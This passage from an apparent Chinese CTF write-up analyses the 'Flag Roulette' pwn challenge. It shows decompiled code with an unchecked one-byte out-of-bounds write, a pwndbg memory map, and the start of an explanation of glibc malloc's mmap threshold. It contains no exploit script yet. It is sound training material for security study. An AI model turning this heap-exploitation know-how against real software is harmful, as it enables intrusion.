      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-24h] BYREF</span>
  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+Dh] [rbp-23h]</span>
  <span class="kt">char</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Eh] [rbp-22h]</span>
  <span class="kt">char</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+Fh] [rbp-21h]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-1Ch] BYREF</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">k</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-14h]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]</span>

  <span class="n">v12</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="kt">int</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">))</span><span class="n">banner</span><span class="p">)(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">menu</span><span class="p">)();</span>
      <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">()</span> <span class="p">)</span>
        <span class="p">;</span>
      <span class="k">while</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">!=</span> <span class="mi">10</span> <span class="p">)</span>
        <span class="n">v6</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">51</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">51</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">49</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
          <span class="p">{</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"You already have a bet placed"</span><span class="p">);</span>
          <span class="p">}</span>
          <span class="k">else</span>
          <span class="p">{</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"How many bytes would you like to bet on ?"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
            <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%ud"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v8</span> <span class="o">&gt;</span> <span class="mh">0x7F</span> <span class="p">)</span>
            <span class="p">{</span>
              <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v8</span> <span class="o">&lt;=</span> <span class="mh">0x21000</span> <span class="p">)</span>
              <span class="p">{</span>
                <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">v8</span><span class="p">);</span>
                <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">v8</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
                <span class="p">{</span>
                  <span class="k">do</span>
                  <span class="p">{</span>
                    <span class="k">do</span>
                      <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
                    <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">31</span> <span class="p">);</span>
                  <span class="p">}</span>
                  <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="mi">127</span> <span class="p">);</span>
                <span class="p">}</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"Random pattern generated successfully"</span><span class="p">);</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">As a sign of good will, we will let you modify set exactly one byte in this sea of randomness"</span><span class="p">);</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"Please choose the index of the byte to modify"</span><span class="p">);</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
                <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%ud"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v7</span><span class="p">);</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"Please set the new value of this byte"</span><span class="p">);</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
                <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%ud"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
                <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">v7</span><span class="p">)</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"Modification successful"</span><span class="p">);</span>
                <span class="n">v4</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
              <span class="p">}</span>
              <span class="k">else</span>
              <span class="p">{</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"Come on, you cannot be THAT lucky ;)"</span><span class="p">);</span>
              <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
              <span class="n">puts</span><span class="p">(</span><span class="s">"Not enough bytes"</span><span class="p">);</span>
              <span class="n">puts</span><span class="p">(</span><span class="s">"The bet is not risky enough"</span><span class="p">);</span>
            <span class="p">}</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">50</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
          <span class="p">{</span>
            <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
            <span class="n">ptr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"Bet successfully deleted"</span><span class="p">);</span>
            <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span>
          <span class="p">{</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"You have no bet placed"</span><span class="p">);</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"You have not placed a bet !"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Your bet : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">v8</span><span class="p">;</span> <span class="n">k</span> <span class="o">+=</span> <span class="mi">3</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">k</span><span class="p">)</span> <span class="o">!=</span> <span class="sc">'G'</span> <span class="p">)</span>
      <span class="n">lose</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">k</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="sc">'C'</span> <span class="p">)</span>
      <span class="n">lose</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">k</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="sc">'C'</span> <span class="p">)</span>
      <span class="n">lose</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="n">win</span><span class="p">();</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>
    <p>主要的功能大概就是：</p>

    <ul>
      <li>添加一个 <code class="language-plaintext highlighter-rouge">0x80 ~ 0x21000</code>​ 之间的一个堆块（只能同时存在一个堆块，需要释放后才能再次申请）</li>
      <li>释放堆块</li>
      <li>exit(0)</li>
    </ul>
  </li>
</ul>

<blockquote>
  <p>在添加堆块功能中可以修改 分配堆块中的one byte ，由于没有边界检查，这种疏忽会引入一个 <strong>相对的越界写入</strong> 漏洞。</p>

  <p>(<strong>out-of-bound write</strong>)</p>
</blockquote>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vp</span>
<span class="n">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
             <span class="n">Start</span>                <span class="n">End</span> <span class="n">Perm</span>     <span class="n">Size</span> <span class="n">Offset</span> <span class="n">File</span>
    <span class="mh">0x5995f6a88000</span>     <span class="mh">0x5995f6a89000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>      <span class="mi">0</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">flag_roulette</span>
    <span class="mh">0x5995f6a89000</span>     <span class="mh">0x5995f6a8a000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span>   <span class="mi">1000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">flag_roulette</span>
    <span class="mh">0x5995f6a8a000</span>     <span class="mh">0x5995f6a8b000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>   <span class="mi">2000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">flag_roulette</span>
    <span class="mh">0x5995f6a8b000</span>     <span class="mh">0x5995f6a8c000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>   <span class="mi">2000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">flag_roulette</span>
    <span class="mh">0x5995f6a8c000</span>     <span class="mh">0x5995f6a8d000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">1000</span>   <span class="mi">3000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">flag_roulette</span>
    <span class="mh">0x5995f6a8d000</span>     <span class="mh">0x5995f6a9f000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>    <span class="mi">12000</span>   <span class="mi">5000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">flag_roulette</span>
    <span class="mh">0x5995f757c000</span>     <span class="mh">0x5995f759d000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>    <span class="mi">21000</span>      <span class="mi">0</span> <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
    <span class="mh">0x7e197eadc000</span>     <span class="mh">0x7e197eb00000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>    <span class="mi">24000</span>      <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7e197eadc</span><span class="p">]</span>    <span class="c1"># tls 所在段，申请的big chunk 也会在这里
</span>    <span class="mh">0x7e197eb00000</span>     <span class="mh">0x7e197eb26000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>    <span class="mi">26000</span>      <span class="mi">0</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>
    <span class="mh">0x7e197eb26000</span>     <span class="mh">0x7e197ec7b000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>   <span class="mi">155000</span>  <span class="mi">26000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>
    <span class="mh">0x7e197ec7b000</span>     <span class="mh">0x7e197eccf000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>    <span class="mi">54000</span> <span class="mi">17</span><span class="n">b000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>
    <span class="mh">0x7e197eccf000</span>     <span class="mh">0x7e197ecd3000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">4000</span> <span class="mi">1</span><span class="n">cf000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>
    <span class="mh">0x7e197ecd3000</span>     <span class="mh">0x7e197ecd5000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">2000</span> <span class="mi">1</span><span class="n">d3000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>
    <span class="mh">0x7e197ecd5000</span>     <span class="mh">0x7e197ece2000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="n">d000</span>      <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7e197ecd5</span><span class="p">]</span>
    <span class="mh">0x7e197ece2000</span>     <span class="mh">0x7e197ece4000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">2000</span>      <span class="mi">0</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">libseccomp</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>
    <span class="mh">0x7e197ece4000</span>     <span class="mh">0x7e197ecf2000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="n">e000</span>   <span class="mi">2000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">libseccomp</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>
    <span class="mh">0x7e197ecf2000</span>     <span class="mh">0x7e197ed00000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="n">e000</span>  <span class="mi">10000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">libseccomp</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>
    <span class="mh">0x7e197ed00000</span>     <span class="mh">0x7e197ed01000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>  <span class="mf">1e000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">libseccomp</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>
    <span class="mh">0x7e197ed01000</span>     <span class="mh">0x7e197ed02000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">1000</span>  <span class="mi">1</span><span class="n">f000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">libseccomp</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>
    <span class="mh">0x7e197ed02000</span>     <span class="mh">0x7e197ed04000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">2000</span>      <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7e197ed02</span><span class="p">]</span>
    <span class="mh">0x7e197ed04000</span>     <span class="mh">0x7e197ed05000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span>      <span class="mi">0</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>
    <span class="mh">0x7e197ed05000</span>     <span class="mh">0x7e197ed2a000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>    <span class="mi">25000</span>   <span class="mi">1000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>
    <span class="mh">0x7e197ed2a000</span>     <span class="mh">0x7e197ed34000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="n">a000</span>  <span class="mi">26000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>
    <span class="mh">0x7e197ed34000</span>     <span class="mh">0x7e197ed36000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">2000</span>  <span class="mi">30000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>
    <span class="mh">0x7e197ed36000</span>     <span class="mh">0x7e197ed38000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">2000</span>  <span class="mi">32000</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">CTF_Time_No</span><span class="o">/</span><span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>
    <span class="mh">0x7ffeecef8000</span>     <span class="mh">0x7ffeecf19000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>    <span class="mi">21000</span>      <span class="mi">0</span> <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
    <span class="mh">0x7ffeecf24000</span>     <span class="mh">0x7ffeecf28000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">4000</span>      <span class="mi">0</span> <span class="p">[</span><span class="n">vvar</span><span class="p">]</span>
    <span class="mh">0x7ffeecf28000</span>     <span class="mh">0x7ffeecf2a000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">2000</span>      <span class="mi">0</span> <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
<span class="mh">0xffffffffff600000</span> <span class="mh">0xffffffffff601000</span> <span class="o">--</span><span class="n">xp</span>     <span class="mi">1000</span>      <span class="mi">0</span> <span class="p">[</span><span class="n">vsyscall</span><span class="p">]</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="malloc-的部分工作原理"><span class="me-2">malloc 的部分工作原理</span><a href="#malloc-的部分工作原理" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>这部分呢也是学到了新的知识，现在我们先看一下 <code class="language-plaintext highlighter-rouge">malloc</code>​ 的部分工作原理</p>

<p>如果申请的size很大（超过  <code class="language-plaintext highlighter-rouge">mp_.mmap_threshold</code>​，默认为  <code class="language-plaintext highlighter-rouge">128*1024 = 0x20000</code>​），它就会使用  <code class="language-plaintext highlighter-rouge">mmap</code>​ 而不是将块放在heap中。</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
</pre></td><td class="rouge-code"><pre>
<span class="cp">#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) // 0x20000
#define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN
</span>
<span class="err">······</span>

<span class="cm">/* There is only one instance of the malloc parameters.  */</span>

<span class="k">static</span> <span class="k">struct</span> <span class="n">malloc_par</span> <span class="n">mp_</span> <span class="o">=</span>
<span class="p">{</span>
  <span class="p">.</span><span class="n">top_pad</span> <span class="o">=</span> <span class="n">DEFAULT_TOP_PAD</span><span class="p">,</span>
  <span class="p">.</span><span class="n">n_mmaps_max</span> <span class="o">=</span> <span class="n">DEFAULT_MMAP_MAX</span><span class="p">,</span>
